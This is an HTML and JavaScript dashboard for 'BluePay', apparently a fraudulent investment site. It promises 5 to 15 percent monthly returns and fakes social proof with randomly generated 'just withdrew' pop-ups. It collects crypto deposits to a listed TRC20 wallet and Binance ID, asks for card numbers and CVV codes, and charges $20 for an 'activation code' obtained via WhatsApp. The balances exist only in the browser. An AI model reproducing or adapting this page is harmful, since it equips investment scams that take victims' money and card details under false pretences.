<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BluePay Dashboard</title>
<style>
:root {
    --blue:#0b1ea8; --dark:#081a8c; --green:#2ecc71;
    --orange:#e67e22; --gold:#f1c40f; --purple:#9b59b6;
}
body {margin:0; font-family:'Segoe UI',sans-serif; background:var(--blue); color:white; padding-bottom:120px;}
header {background:var(--dark); padding:15px; display:flex; justify-content:space-between; align-items:center;}
header div {cursor:pointer;}
.container{max-width:480px; margin:auto; padding:20px;}
.card{background:rgba(0,0,0,0.4); padding:20px; margin:15px 0; border-radius:18px; border:1px solid rgba(255,255,255,0.1); backdrop-filter:blur(10px);}
button{padding:12px 10px; margin:5px; border:none; border-radius:10px; cursor:pointer; font-weight:bold; display:flex; align-items:center; justify-content:center;}
button i{margin-right:8px;}
.toast{position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white;color:#333; padding:12px 20px; border-radius:50px; font-size:13px;font-weight:bold;box-shadow:0 10px 25px rgba(0,0,0,0.3); display:none;}
.floating-whatsapp { position:fixed; bottom:20px; right:20px; background:#25D366; color:white; border-radius:50%; width:60px; height:60px; display:flex; align-items:center; justify-content:center; font-size:30px; cursor:pointer; box-shadow:0 5px 15px rgba(0,0,0,0.3);}
.modal, .overlay{display:none; position:fixed; top:0; left:0; width:100%; height:100%;}
.overlay{background:rgba(0,0,0,0.8); z-index:999;}
.modal{background:var(--dark); width:90%; max-width:400px; top:50%; left:50%; transform:translate(-50%,-50%); border-radius:20px; padding:20px; z-index:1000;}
input, select{width:100%; padding:12px; margin:8px 0; border-radius:10px; border:none; font-weight:bold; color:#000;}
</style>
</head>
<body>

<header>
    <div onclick="toggleMenu()">☰ Menu</div>
    <div id="welcomeMsg">BLUEPAY</div>
    <div onclick="logout()">Logout 🚪</div>
</header>

<div class="container">

    <!-- Balance -->
    <div class="card" style="text-align:center; border:2px solid var(--green);">
        <small>Available Balance</small>
        <div style="font-size:38px; font-weight:900; color:var(--green);">$ <span id="userBal">0</span></div>
    </div>

    <!-- Buttons row -->
    <div class="card" style="display:flex; flex-wrap:wrap; justify-content:space-between;">
        <button style="background:#3498db;" onclick="openInvestment()"><i>💹</i>Investment</button>
        <button style="background:var(--orange);" onclick="openWithdraw()"><i>💸</i>Withdraw</button>
        <button style="background:var(--gold);" onclick="openDeposit()"><i>📥</i>Deposit</button>
        <button style="background:var(--purple);" onclick="openSavings()"><i>💰</i>Savings</button>
        <button style="background:#444;" onclick="openTransactions()"><i>📝</i>Transactions</button>
        <button style="background:var(--green);" onclick="activateAccount()"><i>🔑</i>Activate Account</button>
        <button style="background:#555;" onclick="editProfile()"><i>👤</i>Profile</button>
    </div>

</div>

<!-- Toast -->
<div class="toast" id="toastMsg">Someone withdrew $100</div>

<!-- Floating WhatsApp -->
<div class="floating-whatsapp" onclick="openWhatsApp()">📱</div>

<!-- Overlay + Modals -->
<div class="overlay" id="overlay"></div>
<div class="modal" id="modal">
    <h3 id="modalTitle"></h3>
    <div id="modalContent"></div>
    <button onclick="closeModal()">Close</button>
</div>

<script>
// User data
let users = JSON.parse(localStorage.getItem("bluepay_users"))||[];
let currentEmail = localStorage.getItem("bluepay_current");
let currentUser = users.find(u=>u.email===currentEmail);

// Welcome message
const welcomeEl = document.getElementById("welcomeMsg");
if(currentUser.name.toLowerCase()==="loski"){
    welcomeEl.innerText = `Welcome back, ${currentUser.name}!`;
}else{
    welcomeEl.innerText = `Welcome to BluePay Investment Company, ${currentUser.name}!`;
}
document.getElementById("userBal").innerText = currentUser.balance.toFixed(2);

// Menu toggle
function toggleMenu(){
    const details = `
    <p><b>Manager:</b> Jessica Smith (UK)</p>
    <p><b>WhatsApp:</b> +447766494570</p>
    <p><b>Company started:</b> 2018</p>
    <p><b>Active Users:</b> 60M+</p>
    `;
    showModal("Menu",details);
}

// WhatsApp support
function openWhatsApp(){
    const text = encodeURIComponent("How can I withdraw my bonuses? I'm a new member?");
    window.open("https://wa.me/447766494570?text="+text,"_blank");
}

// Logout
function logout(){ localStorage.removeItem("bluepay_current"); window.location.href="login.html"; }

// Toast messages
const names = ["Mpho","Kabelo","Neo","Lerato","Thabo","Chipo","Amina","Taye","Kwame","Fatima"];
setInterval(()=>{
    const n=names[Math.floor(Math.random()*names.length)];
    const amt=(Math.floor(Math.random()*5)+1)*100;
    const t=document.getElementById("toastMsg");
    t.innerText=`${n} just withdrew $${amt}`;
    t.style.display="block";
    setTimeout(()=>{t.style.display="none";},4000);
},5000);

// Modal
const overlay = document.getElementById("overlay");
const modal = document.getElementById("modal");
function showModal(title,content){
    modal.style.display="block";
    overlay.style.display="block";
    document.getElementById("modalTitle").innerText=title;
    document.getElementById("modalContent").innerHTML=content;
}
function closeModal(){
    modal.style.display="none";
    overlay.style.display="none";
}

// Investment
function openInvestment(){
    const plans = `
    <p><b>Basic:</b> Min $20, Interest 5% monthly</p>
    <p><b>Premium:</b> Min $100, Interest 10% monthly</p>
    <p><b>Gold:</b> Min $500, Interest 15% monthly</p>
    <input type="number" id="investAmt" placeholder="Enter amount">
    <input type="password" id="bpcKey" placeholder="Enter BPC Code">
    <button onclick="submitInvestment()">Deposit Investment</button>
    `;
    showModal("Investment Plans",plans);
}
function submitInvestment(){
    const amt=parseFloat(document.getElementById("investAmt").value);
    const code=document.getElementById("bpcKey").value;
    if(code!=="Loski") return alert("Wrong BPC code");
    if(amt>currentUser.balance) return alert("Insufficient balance");
    currentUser.balance-=amt;
    localStorage.setItem("bluepay_users",JSON.stringify(users));
    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
    alert("Investment submitted for approval!");
    closeModal();
}

// Withdraw
function openWithdraw(){
    const content = `
    <p>Withdraw to:</p>
    <select id="withdrawType" onchange="withdrawTypeChange()">
        <option value="bank">Bank</option>
        <option value="mobile">Mobile Money</option>
        <option value="crypto">Crypto</option>
    </select>
    <div id="withdrawFields"></div>
    <input type="number" id="withdrawAmt" placeholder="Amount">
    <input type="password" id="withdrawBPC" placeholder="Enter BPC Code">
    <button onclick="submitWithdraw()">Withdraw</button>
    `;
    showModal("Withdraw Funds",content);
}
function withdrawTypeChange(){
    const type=document.getElementById("withdrawType").value;
    let html="";
    if(type==="bank"){
        html='<input type="text" id="bankAcc" placeholder="Bank Account Number">';
    }else if(type==="mobile"){
        html='<input type="text" id="mobileNum" placeholder="Mobile Money Number">';
    }else if(type==="crypto"){
        html='<input type="text" id="cryptoAddr" placeholder="TRC20 or Binance ID">';
    }
    document.getElementById("withdrawFields").innerHTML=html;
}
function submitWithdraw(){
    const amt=parseFloat(document.getElementById("withdrawAmt").value);
    const bpc=document.getElementById("withdrawBPC").value;
    if(bpc!=="Loski") return alert("Wrong BPC Code");
    if(amt>currentUser.balance) return alert("Insufficient balance");
    currentUser.balance-=amt;
    localStorage.setItem("bluepay_users",JSON.stringify(users));
    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
    alert("Withdrawal submitted for approval!");
    closeModal();
}

// Deposit
function openDeposit(){
    const content = `
    <p>Deposit via:</p>
    <select id="depositType" onchange="depositTypeChange()">
        <option value="crypto">Crypto</option>
        <option value="card">Card</option>
    </select>
    <div id="depositFields">
        <p>TRC20: TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR</p>
        <p>Binance ID: 860603099</p>
        <input type="file" id="depositProof">
    </div>
    <button onclick="submitDeposit()">Submit Deposit</button>
    `;
    showModal("Deposit Funds",content);
}
function depositTypeChange(){
    const type=document.getElementById("depositType").value;
    let html="";
    if(type==="crypto"){
        html='<p>TRC20: TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR</p><p>Binance ID: 860603099</p><input type="file" id="depositProof">';
    }else if(type==="card"){
        html='<input type="text" id="cardNum" placeholder="Card Number"><input type="text" id="cardExp" placeholder="Expiry MM/YY"><input type="text" id="cardCvv" placeholder="CVV">';
    }
    document.getElementById("depositFields").innerHTML=html;
}
function submitDeposit(){
    alert("Deposit submitted for approval! Admin will verify.");
    closeModal();
}

// Savings
function openSavings(){
    const content = `
    <p>Current Saving Balance: $0</p>
    <input type="number" id="saveAmt" placeholder="Amount">
    <input type="password" id="saveBPC" placeholder="Enter BPC Code">
    <button onclick="submitSaveDeposit()">Deposit to Savings</button>
    <button onclick="submitSaveWithdraw()">Withdraw from Savings</button>
    `;
    showModal("Savings",content);
}
function submitSaveDeposit(){
    const amt=parseFloat(document.getElementById("saveAmt").value);
    const bpc=document.getElementById("saveBPC").value;
    if(bpc!=="Loski") return alert("Wrong BPC");
    if(amt>currentUser.balance) return alert("Insufficient balance");
    currentUser.balance-=amt;
    localStorage.setItem("bluepay_users",JSON.stringify(users));
    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
    alert("Deposited to savings!");
    closeModal();
}
function submitSaveWithdraw(){
    const amt=parseFloat(document.getElementById("saveAmt").value);
    const bpc=document.getElementById("saveBPC").value;
    if(bpc!=="Loski") return alert("Wrong BPC");
    currentUser.balance+=amt;
    localStorage.setItem("bluepay_users",JSON.stringify(users));
    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
    alert("Withdrawn from savings!");
    closeModal();
}

// Transactions
function openTransactions(){
    let html="<ul>";
    html+=`<li>Transactions are not implemented yet</li>`;
    html+="</ul>";
    showModal("Transactions",html);
}

// Activate account
function activateAccount(){
    const content = `
    <button onclick="openWhatsApp()">Get BPC Code via WhatsApp</button>
    <p>Or Buy Online for $20</p>
    <button onclick="alert('Pay $20 via TRC20 or Binance ID and submit proof')">Buy BPC Code</button>
    `;
    showModal("Activate Account",content);
}

// Profile
function editProfile(){
    const content = `
    <input type="text" id="editName" value="${currentUser.name}">
    <input type="email" id="editEmail" value="${currentUser.email}">
    <input type="text" id="editPhone" value="${currentUser.phone}">
    <button onclick="saveProfile()">Save Changes</button>
    `;
    showModal("Edit Profile",content);
}
function saveProfile(){
    currentUser.name=document.getElementById("editName").value;
    currentUser.email=document.getElementById("editEmail").value;
    currentUser.phone=document.getElementById("editPhone").value;
    localStorage.setItem("bluepay_users",JSON.stringify(users));
    welcomeEl.innerText=`Welcome to BluePay Investment Company, ${currentUser.name}!`;
    alert("Profile updated!");
    closeModal();
}
</script>

</body>
</html>
